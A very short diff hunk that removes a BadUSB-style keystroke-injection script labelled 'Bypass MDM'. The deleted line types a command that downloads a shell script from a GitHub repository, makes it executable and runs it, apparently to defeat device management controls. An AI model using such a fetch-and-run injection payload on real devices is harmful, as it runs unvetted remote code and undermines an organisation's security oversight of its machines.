@@ -1,4 +1,0 @@
-REM Bypass MDM
-
-
-STRINGLN curl https://raw.githubusercontent.com/Rekitctrl/bypass-mdm/main/bypass-mdm-badkb.sh -o bypass-mdm-badkb.sh && chmod +x ./bypass-mdm-badkb.sh && ./bypass-mdm-badkb.sh
